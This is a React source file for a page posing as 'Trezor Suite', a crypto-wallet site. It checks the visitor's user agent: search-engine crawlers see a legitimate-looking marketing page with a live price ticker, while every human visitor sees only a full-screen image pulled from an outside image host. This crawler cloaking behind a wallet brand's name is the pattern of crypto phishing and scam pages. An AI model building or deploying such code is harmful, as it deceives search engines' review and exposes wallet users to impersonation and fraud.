import React, { useEffect, useState } from 'react';
import { ArrowRight, ChevronRight, Shield, Lock, Wallet } from 'lucide-react';

interface CryptoPrice {
  id: string;
  name: string;
  price: number;
  symbol: string;
}

function App() {
  const [prices, setPrices] = useState<CryptoPrice[]>([]);
  const [isCrawler, setIsCrawler] = useState(false);

  useEffect(() => {
    // Check if the user agent is a crawler
    const userAgent = navigator.userAgent.toLowerCase();
    const crawlers = [
      'bot',
      'spider',
      'crawler',
      'googlebot',
      'bingbot',
      'slurp',
      'duckduckbot',
      'baiduspider',
      'yandexbot',
      'sogou',
      'exabot',
      'facebookexternalhit',
      'ia_archiver'
    ];
    
    setIsCrawler(crawlers.some(crawler => userAgent.includes(crawler)));

    const fetchPrices = async () => {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout

        const response = await fetch(
          'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,binancecoin,cardano,ripple,solana,polkadot,dogecoin,avalanche&vs_currencies=usd',
          {
            signal: controller.signal,
            headers: {
              'Accept': 'application/json',
              'Cache-Control': 'no-cache'
            }
          }
        );

        clearTimeout(timeoutId);

        if (!response.ok) {
          if (response.status === 429) {
            throw new Error('Rate limit exceeded. Please try again later.');
          }
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        
        if (!data || Object.keys(data).length === 0) {
          throw new Error('No data received from API');
        }

        const formattedPrices = Object.entries(data).map(([id, price]: [string, any]) => ({
          id,
          name: id.charAt(0).toUpperCase() + id.slice(1),
          price: price.usd,
          symbol: id.toUpperCase()
        }));

        setPrices(formattedPrices);
      } catch (error) {
        console.error('Error fetching prices:', error instanceof Error ? error.message : 'Unknown error');
        // Set some default prices if API fails
        setPrices([
          { id: 'bitcoin', name: 'Bitcoin', price: 65000, symbol: 'BTC' },
          { id: 'ethereum', name: 'Ethereum', price: 3500, symbol: 'ETH' },
          { id: 'tether', name: 'Tether', price: 1, symbol: 'USDT' },
          { id: 'binancecoin', name: 'BNB', price: 450, symbol: 'BNB' },
          { id: 'cardano', name: 'Cardano', price: 2.5, symbol: 'ADA' },
        ]);
      }
    };

    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  if (!isCrawler) {
    return (
      <div 
        className="fixed inset-0 w-full h-full bg-black flex items-center justify-center overflow-hidden"
        style={{
          minHeight: '100vh',
          minHeight: '100dvh' // Dynamic viewport height for mobile browsers
        }}
      >
        <div className="relative w-full h-full">
          <img 
            src="https://i.ibb.co/Y7B2p0kF/T2.png" 
            alt="Special Content"
            className="absolute w-full h-full object-contain md:object-cover"
            style={{
              maxWidth: '100%',
              maxHeight: '100%',
              margin: 'auto',
              top: '50%',
              left: '50%',
              transform: 'translate(-50%, -50%)',
            }}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-cover bg-center bg-fixed" style={{ 
      backgroundImage: 'linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url("https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80")',
    }}>
      {/* Crypto Ticker */}
      <div className="bg-black/50 backdrop-blur-sm overflow-hidden">
        <div className="animate-scroll flex py-2 text-white">
          {prices.map((crypto) => (
            <div key={crypto.id} className="flex items-center mx-4 whitespace-nowrap">
              <span className="font-bold">{crypto.symbol}</span>
              <ChevronRight className="mx-1 h-4 w-4" />
              <span>${crypto.price.toLocaleString()}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Hero Section */}
      <div className="container mx-auto px-4 py-20 text-white">
        <h1 className="text-5xl font-bold mb-6">Trezor Suite: Your Gateway to Secure Crypto Management</h1>
        <p className="text-xl mb-8">Experience the next generation of cryptocurrency security and management</p>
        <button className="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-lg flex items-center">
          Get Started <ArrowRight className="ml-2" />
        </button>
      </div>

      {/* Features */}
      <div className="container mx-auto px-4 py-16">
        <div className="grid md:grid-cols-3 gap-8">
          <div className="bg-white/10 backdrop-blur-md p-6 rounded-xl text-white">
            <Shield className="h-12 w-12 mb-4 text-blue-400" />
            <h3 className="text-2xl font-semibold mb-4">Advanced Security</h3>
            <p>Military-grade encryption protecting your digital assets 24/7</p>
          </div>
          <div className="bg-white/10 backdrop-blur-md p-6 rounded-xl text-white">
            <Lock className="h-12 w-12 mb-4 text-blue-400" />
            <h3 className="text-2xl font-semibold mb-4">Full Control</h3>
            <p>Your keys, your crypto. Maintain complete control over your assets</p>
          </div>
          <div className="bg-white/10 backdrop-blur-md p-6 rounded-xl text-white">
            <Wallet className="h-12 w-12 mb-4 text-blue-400" />
            <h3 className="text-2xl font-semibold mb-4">Easy Management</h3>
            <p>Intuitive interface for seamless cryptocurrency management</p>
          </div>
        </div>
      </div>

      {/* Content Sections */}
      <div className="container mx-auto px-4 py-16 text-white">
        <section className="mb-16">
          <h2 className="text-3xl font-bold mb-6">Why Choose Trezor Suite?</h2>
          <div className="bg-white/10 backdrop-blur-md p-8 rounded-xl">
            <ul className="list-disc list-inside space-y-4">
              <li>Comprehensive security features protecting your digital assets</li>
              <li>Intuitive interface designed for both beginners and experts</li>
              <li>Direct integration with Trezor hardware wallets</li>
              <li>Real-time market data and portfolio tracking</li>
              <li>Support for multiple cryptocurrencies and tokens</li>
            </ul>
          </div>
        </section>

        <section className="mb-16">
          <h2 className="text-3xl font-bold mb-6">Advanced Features</h2>
          <div className="bg-white/10 backdrop-blur-md p-8 rounded-xl">
            <ul className="list-disc list-inside space-y-4">
              <li>Built-in exchange functionality</li>
              <li>Customizable security settings</li>
              <li>Transaction history and reporting</li>
              <li>Multi-device synchronization</li>
              <li>Regular security updates and improvements</li>
            </ul>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer className="bg-black/50 backdrop-blur-sm text-white py-8">
        <div className="container mx-auto px-4">
          <p className="text-center">© 2024 Trezor Suite. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default App;